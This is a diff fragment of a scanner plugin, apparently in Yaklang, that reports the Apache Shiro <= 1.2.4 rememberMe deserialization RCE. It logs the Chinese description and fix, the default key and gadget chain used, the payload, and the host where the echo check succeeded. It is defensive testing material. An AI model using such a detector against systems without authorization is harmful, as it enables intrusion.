+                    risk.description("Apache Shiro <= 1.2.4 版本中，加密的用户信息序列化后存储在Cookie的rememberMe字段中，攻击者可以使用Shiro的AES加密算法的默认密钥来构造恶意的Cookie rememberMe值，发送到Shiro服务端之后会先后进行Base64解码、AES解密、readObject()反序列化，从而触发Java原生反序列化漏洞，进而实现RCE。该漏洞的根源在于硬编码Key。"),
+                    risk.solution("升级到Apache Shiro 1.2.5或更高版本，并配置 'rememberMe' 功能的密钥。"),
+                    risk.titleVerbose(sprintf("%v(Shiro Header 回显)：%v", vulInfo, res.Url)),
+                    risk.type("rce"),
+                    risk.parameter("Key: "+ bs64key +" 利用链: " + blindDetail["gadgets"]),
+                    risk.payload(payload),
+                    risk.details(blindDetail),
+                )
+                EchoSuccessHost.Append(str.ParseStringUrlToUrlInstance(res.Url)~.Host)
+                return true
+            }
+        }
+    return false
+}
+
+
+clear = func() {
+    cancel()
+}
